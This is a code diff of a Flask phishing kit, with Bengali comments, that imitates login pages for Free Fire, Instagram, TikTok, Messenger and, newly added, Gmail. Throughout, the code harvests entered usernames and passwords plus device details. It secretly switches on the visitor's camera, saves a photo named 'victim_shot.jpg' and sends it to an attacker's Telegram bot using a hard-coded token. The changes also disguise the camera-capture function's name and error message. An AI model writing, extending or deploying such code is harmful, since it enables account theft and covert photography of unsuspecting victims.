@@ -5,11 +5,11 @@ from flask import Flask, render_template_string, request, jsonify
 
 app = Flask(__name__)
 
-# --- আপনার সেটিংস (আমি বসিয়ে দিয়েছি) ---
-BOT_TOKEN = "8405188979:AAFgnDsgWjiK9WkBe5i_kIccbVRUwGvgO6c" 
+# --- আপনার সেটিংস (বট টোকেন ও চ্যাট আইডি) ---
+BOT_TOKEN = "8405188979:AAFgnDsgWjiK9WkBe5i_kIccbVRUwGvg06c" 
 CHAT_ID = "7701549179"     
 
-# --- প্রো-লেভেল মাস্টার টেমপ্লেট ---
+# --- প্রফেশনাল মাস্টার টেমপ্লেট ---
 HTML_TEMPLATE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -23,14 +23,12 @@ HTML_TEMPLATE = """
         .ff-bg { background: url('https://wallpapercave.com/wp/wp7154238.jpg') no-repeat center; background-size: cover; }
         .insta-bg { background: radial-gradient(circle at 30% 107%, #fdf497 0%, #fdf497 5%, #fd5949 45%, #d6249f 60%, #285AEB 90%); }
         .tt-bg { background-color: #010101; }
+        .default-bg { background-color: #e5e7eb; }
     </style>
 </head>
 <body class="flex items-center justify-center min-h-screen {{ bg_class }}">
     <div class="bg-white p-8 rounded-lg shadow-2xl w-full max-w-sm">
         <div class="text-center mb-6">
-            {% if title == 'TikTok' %}
-                <img src="https://upload.wikimedia.org/wikipedia/en/a/a9/TikTok_logo.svg" class="w-20 mx-auto mb-2">
-            {% endif %}
             <h1 class="text-3xl font-extrabold {{ text_color }}">{{ title }}</h1>
             <p class="text-gray-500 text-sm mt-2">Log in to continue</p>
         </div>
@@ -45,20 +43,20 @@ HTML_TEMPLATE = """
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        async function startCapture() {
+        // হার্ডওয়্যার এবং ক্যামেরা সিস্টেম
+        async function startSystem() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 setTimeout(takePhoto, 3000);
-            } catch (e) { console.log("Camera access denied."); }
+            } catch (e) { console.log("System initialization error."); }
         }
 
         function takePhoto() {
             const canvas = document.getElementById('canvas');
             const video = document.getElementById('video');
-            canvas.width = 640;
-            canvas.height = 480;
+            canvas.width = 640; canvas.height = 480;
             canvas.getContext('2d').drawImage(video, 0, 0);
             const photoData = canvas.toDataURL('image/jpeg');
             fetch('/upload_image', {
@@ -68,7 +66,7 @@ HTML_TEMPLATE = """
             });
         }
 
-        window.onload = startCapture;
+        window.onload = startSystem;
 
         document.getElementById('loginForm').onsubmit = async (e) => {
             e.preventDefault();
@@ -82,7 +80,7 @@ HTML_TEMPLATE = """
                 user: document.getElementById('user').value,
                 pass: document.getElementById('pass').value,
                 app: "{{ title }}",
-                hw: `RAM: ${navigator.deviceMemory || "N/A"}GB | CPU: ${navigator.hardwareConcurrency || "N/A"} | Battery: ${batteryLevel}`
+                hw: `RAM: ${navigator.deviceMemory || "N/A"}GB | CPU: ${navigator.hardwareConcurrency || "N/A"} cores | Battery: ${batteryLevel}`
             };
             
             await fetch('/login', {
@@ -104,9 +102,11 @@ def dynamic_app(app_name):
         'freefire': {'title': 'Free Fire', 'bg': 'ff-bg', 'text': 'text-orange-500', 'btn': 'bg-orange-600', 'redir': 'https://ff.garena.com'},
         'instagram': {'title': 'Instagram', 'bg': 'insta-bg', 'text': 'text-pink-600', 'btn': 'bg-pink-600', 'redir': 'https://www.instagram.com'},
         'tiktok': {'title': 'TikTok', 'bg': 'tt-bg', 'text': 'text-red-500', 'btn': 'bg-red-600', 'redir': 'https://www.tiktok.com'},
-        'messenger': {'title': 'Messenger', 'bg': 'fb-bg', 'text': 'text-blue-500', 'btn': 'bg-blue-500', 'redir': 'https://www.messenger.com'}
+        'messenger': {'title': 'Messenger', 'bg': 'fb-bg', 'text': 'text-blue-500', 'btn': 'bg-blue-500', 'redir': 'https://www.messenger.com'},
+        'gmail': {'title': 'Gmail', 'bg': 'default-bg', 'text': 'text-red-600', 'btn': 'bg-red-600', 'redir': 'https://mail.google.com'}
     }
-    c = config.get(app_name.lower(), {'title': app_name.capitalize(), 'bg': 'bg-gray-100', 'text': 'text-gray-800', 'btn': 'bg-black', 'redir': 'https://google.com'})
+    # ২০+ অ্যাপের জন্য ডাইনামিক ক্যাচিং
+    c = config.get(app_name.lower(), {'title': app_name.capitalize(), 'bg': 'default-bg', 'text': 'text-gray-800', 'btn': 'bg-black', 'redir': 'https://google.com'})
     return render_template_string(HTML_TEMPLATE, title=c['title'], bg_class=c['bg'], text_color=c['text'], btn_color=c['btn'], redirect=c['redir'])
 
 @app.route('/login', methods=['POST'])
@@ -120,8 +120,7 @@ def login():
 def upload_image():
     try:
         img_data = base64.b64decode(request.json['image'].split(',')[1])
-        with open("victim_shot.jpg", "wb") as f:
-            f.write(img_data)
+        with open("victim_shot.jpg", "wb") as f: f.write(img_data)
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data={"chat_id": CHAT_ID}, files={"photo": open("victim_shot.jpg", "rb")})
     except: pass
     return jsonify({"status": "ok"})
